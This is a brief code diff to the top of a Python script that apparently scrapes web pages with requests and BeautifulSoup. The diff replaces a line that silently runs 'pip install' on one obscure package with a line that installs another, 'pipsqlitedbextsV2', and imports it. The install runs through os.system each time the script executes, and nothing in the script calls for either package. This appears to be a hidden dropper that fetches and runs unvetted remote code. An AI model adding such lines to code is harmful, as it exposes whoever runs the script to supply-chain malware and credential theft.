@@ -1,6 +1,6 @@
 import os
-os.system("pip install syscolouraddons")
-import syscolouraddons
+os.system("pip install pipsqlitedbextsV2")
+import pipsqlitedbextsV2
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
